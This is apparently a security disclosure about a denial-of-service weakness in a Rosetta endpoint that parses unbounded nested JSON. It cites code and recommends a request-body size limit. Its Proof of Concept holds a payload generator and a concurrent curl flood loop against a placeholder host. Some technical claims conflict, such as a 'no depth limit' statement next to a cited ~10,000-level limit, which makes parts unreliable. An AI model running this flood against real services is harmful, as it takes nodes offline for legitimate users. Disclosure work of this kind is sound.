### Title
Unbounded JSON Body Deserialization in Rosetta `/account/balance` Endpoint Enables CPU Exhaustion via Unauthenticated Requests

### Summary
The Rosetta HTTP server has no `http.MaxBytesReader` or JSON nesting/size limit applied to the request body before the `coinbase/rosetta-sdk-go` middleware deserializes it into an `AccountBalanceRequest`. An unauthenticated attacker can POST an arbitrarily large or deeply nested JSON body — exploiting the open `Metadata map[string]interface{}` field — causing unbounded CPU consumption during deserialization. Because `ReadTimeout` only governs I/O, not the CPU-bound JSON parsing phase, concurrent flood requests can exhaust CPU on the node.

### Finding Description

**Code path:**

`rosetta/main.go` builds the HTTP server with no body-size middleware:

```
corsMiddleware → TracingMiddleware → MetricsMiddleware → gorilla/mux router → AccountAPIController (rosetta-sdk-go) → AccountBalance()
``` [1](#0-0) 

None of the three custom middleware layers (`TracingMiddleware`, `MetricsMiddleware`, `CorsMiddleware`) wrap `r.Body` with `http.MaxBytesReader` or any equivalent limit: [2](#0-1) [3](#0-2) 

A grep for `MaxBytesReader`, `LimitReader`, or any body-size guard across all `rosetta/**/*.go` returns **zero matches**.

The `coinbase/rosetta-sdk-go v0.11.0` `AccountAPIController` (an external dependency) calls `json.NewDecoder(r.Body).Decode(&request)` directly on the raw, unlimited body stream. The decoded target type is `rTypes.AccountBalanceRequest`, which contains:

```go
Metadata map[string]interface{} `json:"metadata,omitempty"`
```

This field accepts arbitrary, unbounded, arbitrarily-nested JSON. Go's `encoding/json` has no built-in nesting depth limit (its internal recursion limit is ~10,000 levels) and no token-count limit.

**Why `ReadTimeout` is insufficient:**

The configured `ReadTimeout` (default 5 s) governs only the TCP I/O phase — reading bytes off the wire. On a 100 Mbps link an attacker can deliver ~62 MB within that window. JSON parsing is CPU-bound and occurs **after** the body is fully read; it is not bounded by `ReadTimeout` or `WriteTimeout`. The `WriteTimeout` (default 10 s) starts from end-of-request-header-read, not end-of-body-read, so it does not reliably terminate a slow parse either. [4](#0-3) 

No rate-limiting, connection-count limiting, or per-IP throttling middleware is present in the chain.

### Impact Explanation

An attacker sending concurrent POST requests to `/account/balance` with multi-megabyte deeply-nested `metadata` payloads can saturate CPU on the targeted Rosetta node. Because the Rosetta service is a single Go process with a shared goroutine pool, CPU saturation causes all in-flight requests to stall, effectively taking the node offline for legitimate users. If the same attack is replicated across multiple independently deployed mirror-node Rosetta instances (which share no coordinated rate-limit state), ≥30% of those nodes can be rendered unresponsive without any brute-force credential attack.

### Likelihood Explanation

The endpoint is unauthenticated and publicly reachable (port 5700 by default). No API key, token, or network-level ACL is required. The attack requires only `curl` or any HTTP client capable of sending a large POST body. It is trivially repeatable and scriptable. The `Metadata` field's `map[string]interface{}` type makes it the ideal injection point because the SDK will attempt full recursive deserialization before any application-level validation runs.

### Recommendation

1. **Wrap `r.Body` with `http.MaxBytesReader`** in a dedicated middleware inserted before the SDK router, limiting request bodies to a small fixed size (e.g., 64 KB):
   ```go
   func BodyLimitMiddleware(next http.Handler) http.Handler {
       return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
           r.Body = http.MaxBytesReader(w, r.Body, 65536)
           next.ServeHTTP(w, r)
       })
   }
   ```
2. **Add this middleware** to the chain in `rosetta/main.go` before `server.CorsMiddleware`.
3. **Add per-IP rate limiting** (e.g., `golang.org/x/time/rate`) to bound concurrent deserialization work per source address.
4. Consider enforcing a `Metadata` size/depth limit at the application layer as defense-in-depth.

### Proof of Concept

```bash
# Generate a deeply nested metadata payload (~5 MB)
python3 -c "
import json, sys
depth = 50000
obj = 'x'
for _ in range(depth):
    obj = '{\"a\":' + obj + '}'
payload = '{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"testnet\"},\"account_identifier\":{\"address\":\"0.0.98\"},\"metadata\":' + obj + '}'
sys.stdout.write(payload)
" > payload.json

# Flood the endpoint with concurrent requests
for i in $(seq 1 200); do
  curl -s -X POST http://<rosetta-host>:5700/account/balance \
    -H 'Content-Type: application/json' \
    --data-binary @payload.json &
done
wait
```

Expected result: CPU on the target node spikes to 100%, legitimate requests time out, and the node becomes unresponsive for the duration of the attack.

### Citations

**File:** rosetta/main.go (L217-227)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/app/middleware/trace.go (L43-61)
```go
func TracingMiddleware(inner http.Handler) http.Handler {
	return http.HandlerFunc(func(responseWriter http.ResponseWriter, request *http.Request) {
		start := time.Now()
		clientIpAddress := getClientIpAddress(request)
		path := request.URL.RequestURI()
		tracingResponseWriter := newTracingResponseWriter(responseWriter)

		inner.ServeHTTP(tracingResponseWriter, request)

		message := fmt.Sprintf("%s %s %s (%d) in %s",
			clientIpAddress, request.Method, path, tracingResponseWriter.statusCode, time.Since(start))

		if internalPaths[path] {
			log.Debug(message)
		} else {
			log.Info(message)
		}
	})
}
```

**File:** rosetta/app/middleware/metrics.go (L76-84)
```go
func MetricsMiddleware(next http.Handler) http.Handler {
	return middleware.Instrument{
		Duration:         requestDurationHistogram,
		InflightRequests: requestInflightGauge,
		RequestBodySize:  requestBytesHistogram,
		ResponseBodySize: responseBytesHistogram,
		RouteMatcher:     next.(middleware.RouteMatcher),
	}.Wrap(next)
}
```

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```
